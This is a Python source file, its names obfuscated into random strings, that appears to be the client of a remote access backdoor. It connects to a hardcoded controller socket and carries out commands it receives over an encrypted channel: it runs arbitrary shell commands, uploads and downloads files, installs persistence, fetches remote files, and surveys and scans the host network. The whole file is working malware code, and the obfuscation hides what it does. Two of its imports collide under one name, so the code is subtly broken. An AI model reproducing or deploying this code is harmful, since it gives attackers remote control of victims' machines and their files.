#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import xYJEIEJwYxrIrxmzUDOdGnbQaPoRNnfl, LQOdRjWyVheTJCytAXEImYNlfGEClgVr, wkCBVuXegTSBSYDZQBgxxzkMPxVjzQTk
    from core.filesock import HbceFmYOVWlodQwVoWSxMaMBMGxoEetP, asXVMcyVvbVzovqlkrejIEPWhlhIaWVQ
    from core.persistence import KSPHuMocsXbfrKZwRqaErcEfeKhnQFFv
    from core.scan import lxpHoRVQHmZlAmDEjqZZhfmtRDctbLaW
    from core.survey import KSPHuMocsXbfrKZwRqaErcEfeKhnQFFv
    from core.toolkit import gCaGLgrmWThFgtcraDJLXlyMiFiZhXtC, TVGWZMRKxoXpZYXviSTfzyVIwwSZWbme
except ImportError as eUdMFlCpoiDTFsjSnbxUiGiaoiDlKvCV:
    print(eUdMFlCpoiDTFsjSnbxUiGiaoiDlKvCV)
    sys.exit(0)
uYTyeRJXwufBhOUIlnhnTaHqSaomYUmR = sys.platform
uBWRbRgMCRXmicVRIraWzSdNZdZEdBkk      = 'localhost'
jQBkBVmVBMwIHtfsVSOejMMfcfYSdIZj      = 1337
SFagktkTtZekEMGVBphiRtNlhUsbBkQV    = 'b14ce95fa4c33ac2803782d18341869f'
def agwPkvRnVPJQSTqUBPpyQIvNgeNDeGSw():
    cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu = socket.socket()
    cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu.connect((uBWRbRgMCRXmicVRIraWzSdNZdZEdBkk, jQBkBVmVBMwIHtfsVSOejMMfcfYSdIZj))
    IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf = wkCBVuXegTSBSYDZQBgxxzkMPxVjzQTk(cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu)
    while True:
        jORShLVTunOVAWYBSEJNrIZoxVzPemwS = cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu.recv(1024)
        jORShLVTunOVAWYBSEJNrIZoxVzPemwS = xYJEIEJwYxrIrxmzUDOdGnbQaPoRNnfl(jORShLVTunOVAWYBSEJNrIZoxVzPemwS, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf)
        nDtpiaZToxctTjxwhKsSYhIGPQjbpePx, _, action = jORShLVTunOVAWYBSEJNrIZoxVzPemwS.partition(' ')
        if nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'quit':
            cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu.close()
            sys.exit(0)
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'run':
            hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt = hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt.stdout.read() + hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt.stderr.read()
            cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu.sendall(LQOdRjWyVheTJCytAXEImYNlfGEClgVr(hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf))
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'download':
            for iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz in action.split():
                iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz = iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz.strip()
                asXVMcyVvbVzovqlkrejIEPWhlhIaWVQ(cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu, iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf)
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'upload':
            for iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz in action.split():
                iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz = iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz.strip()
                HbceFmYOVWlodQwVoWSxMaMBMGxoEetP(cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu, iAjgBfSvQaonUwezAAmbjbsBwsCcDfkz, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf)
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'rekey':
            IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf = wkCBVuXegTSBSYDZQBgxxzkMPxVjzQTk(cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu)
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'persistence':
            hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt = KSPHuMocsXbfrKZwRqaErcEfeKhnQFFv(uYTyeRJXwufBhOUIlnhnTaHqSaomYUmR)
            cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu.send(LQOdRjWyVheTJCytAXEImYNlfGEClgVr(hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf))
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'wget':
            hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt = gCaGLgrmWThFgtcraDJLXlyMiFiZhXtC(action)
            cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu.send(LQOdRjWyVheTJCytAXEImYNlfGEClgVr(hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf))
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'unzip':
            hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt = TVGWZMRKxoXpZYXviSTfzyVIwwSZWbme(action)
            cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu.send(LQOdRjWyVheTJCytAXEImYNlfGEClgVr(hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf))
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'survey':
            hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt = KSPHuMocsXbfrKZwRqaErcEfeKhnQFFv(uYTyeRJXwufBhOUIlnhnTaHqSaomYUmR)
            cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu.send(LQOdRjWyVheTJCytAXEImYNlfGEClgVr(hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf))
        elif nDtpiaZToxctTjxwhKsSYhIGPQjbpePx == 'scan':
            hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt = lxpHoRVQHmZlAmDEjqZZhfmtRDctbLaW(action)
            cfVfTzUSlYOIdEbVStOBAaeUNJdepWJu.send(LQOdRjWyVheTJCytAXEImYNlfGEClgVr(hTHEiuCIZGZSbKRssLNLpfrQaMYerPyt, IHdhaLbgzgEHtkHdgGROniIcWMsgxMaf))
if __name__ == '__main__':
    agwPkvRnVPJQSTqUBPpyQIvNgeNDeGSw()
